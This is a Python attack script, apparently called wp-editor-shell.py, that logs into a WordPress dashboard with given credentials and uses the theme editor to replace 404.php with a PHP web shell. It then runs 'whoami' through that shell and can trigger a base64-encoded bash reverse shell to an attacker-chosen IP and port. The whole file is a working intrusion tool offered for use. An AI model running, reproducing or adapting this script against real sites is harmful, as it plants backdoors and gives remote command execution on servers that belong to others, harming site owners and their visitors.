import requests
from urllib.request import urlopen
from urllib.error import *
import sys
import base64
import time 
import re
from datetime import datetime
import argparse 
from bs4 import BeautifulSoup


# Colors variables 
red = '\033[31m'
green = '\033[32m'
cyan = '\033[36m'
reset = '\033[0m'
bold = '\033[95m'

payload = '<?php system($_GET["cmd"]);?>'


# Function to set all variable value based on the parameters given by the user 
def set_arguments(): 
        global username
        global password
        global target_url 
        global local_ip
        global local_port

        parser = argparse.ArgumentParser(description='You need to give the following arguments --url / -u / -p\nExemple : python wp-editor-shell.py --url http://127.0.0.1/wordpress -u admin -p admin')
        parser.add_argument("-u","--username", help="Username to use for wordpress", required=True)
        parser.add_argument("-p","--password", help="Password to use for wordpress", required=True)
        parser.add_argument("--url", help="Address of the target wordpress webstie (exemple: --url http://127.0.0.1/wordpress)", required=True)
        parser.add_argument("--lhost", help="IP Address to use for the reverse shell")
        parser.add_argument("--lport", help="Local port to use for the reverse shell")
        args = parser.parse_args()
        username = args.username
        password = args.password
        target_url = args.url
        local_ip = args.lhost
        local_port = args.lport






# Function to get the current time, it is used to display time in terminal display infos
def get_current_time():
        return datetime.now().strftime("[%H:%M:%S] ")

# Check if the website is up and running wordpress by checking for /wp-admin
def check_host():
        print(get_current_time(), "Check if host is available") 
        try:
                urlopen(target_url + "/wp-admin/")
                print(get_current_time(), green + "Host is up !" + reset)
                log_into_wordpress_application()
        
        except HTTPError as e: 
                print(get_current_time(), red + "HTTP error ", e)
                quit()
        except URLError as e: 
                print(get_current_time(), red + "Opps ! Page not found !",e )
                quit()


# Function to send a post request to wordpress dashboard and get Cookies values that need to be used later to update 404 page
def log_into_wordpress_application():
        global cookies 
        cookies = ""

        print(get_current_time() ,"Try to log into wordpress dashboard using " + bold + username + ":"+ password + reset)
        session = requests.Session()
        data = {"log":username,"pwd":password}
        headers = 'Content-Type: application/json,Cookie: wordpress_test_cookie=WP%20Cookie%20check'
        r = session.post(target_url + "/wp-login.php", data)
        
        cookies = session.cookies.get_dict() 
        if "wordpress_logged_in" in str(cookies):
                print(get_current_time(), green + "Login successful" + reset)
                update_404_page()
        else: 
                print(get_current_time(),red + "An error occured, the script was unable to log into wordpress dashboard, retry or check if the credentials are correct")
                quit()

# Function to retrieve all theme from the editor page, those theme will then be used to try editing the content of 404 pages
def get_all_themes(): 
        
        global all_themes
        all_themes = []
        r = requests.get(target_url + '/wp-admin/theme-editor.php', cookies=cookies)
        soup = BeautifulSoup(r.text, 'html.parser')
        retrieve_elments = soup.find('select', attrs={'name': 'theme', 'id': 'theme'})

        if retrieve_elments:
                options = retrieve_elments.find_all('option')
                for option in options:
                        value = option['value']
                        all_themes.append(value)
        print(get_current_time(),"The script found " + str(len(all_themes)) + " differents themes")



def update_404_page():
        get_all_themes()

        for theme in all_themes: 
                print(get_current_time(), "Try to update " + theme + " 404 page")
                get = requests.get(target_url + '/wp-admin/theme-editor.php?file=404.php&theme=' + theme, cookies=cookies)
                soup = BeautifulSoup(get.text, 'html.parser')
                retrieve_element = soup.find('input', attrs={'type':'hidden','id':'nonce','name':'nonce'})
                nonce = retrieve_element['value']

                # Find a way to get the nonce 
                if nonce == "":
                        print(get_current_time(),red + "Failed to get nonce for theme : " + theme + reset)
                else:  
                        #print(get_current_time(), "nonce value : " + nonce)
                        data={"nonce":nonce,"newcontent":payload,"file":"404.php","theme":"twentynineteen","_wp_http_referer":"%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentynineteen","action":"edit-theme-plugin-file"}

                        r = requests.post(target_url + '/wp-admin/admin-ajax.php', data, cookies=cookies)
                        #print(get_current_time(), r.text)
                        if "true" in r.text:
                                print(get_current_time(),green + "You now have command injection at " + target_url + "/wp-content/themes/" + theme + "/404.php?cmd=COMMAND"  + reset)
                                test_cmd_injection()
                                if local_ip:
                                        trigger_reverse_shell()
                                quit()
                        else: 
                                print(get_current_time(),red + "Not able to edit page 404 on " + theme + " theme" + reset)

def test_cmd_injection(): 
        cmd_injection= requests.get(target_url + '/wp-content/themes/twentynineteen/404.php?cmd=whoami')

        print(get_current_time() ,"Sending whoami command to try CMD injection")
        print(get_current_time() ,green + cmd_injection.text + reset)

def trigger_reverse_shell():
        
        ## Remove + sign in the base 64 payload
        # if payload contain + it will not load the shell 

        cmd = 'bash -i >& /dev/tcp/' + str(local_ip) + '/' + str(local_port) +'  0>&1'
        cmd_bytes = cmd.encode("ascii")

        base64_bytes = base64.b64encode(cmd_bytes)
        base64_cmd = base64_bytes.decode("ascii")
        
        # Replace + sign with his url encoded version 
        base64_cmd = base64_cmd.replace("+","%2B")
        payload = 'echo ' + base64_cmd + '|base64 -d|bash'
        print(get_current_time(), "Try to trigger the reverse shell")
        cmd_injection= requests.get(target_url + '/wp-content/themes/twentynineteen/404.php?cmd=' + payload)




if __name__ == "__main__": 
        set_arguments()
        check_host()



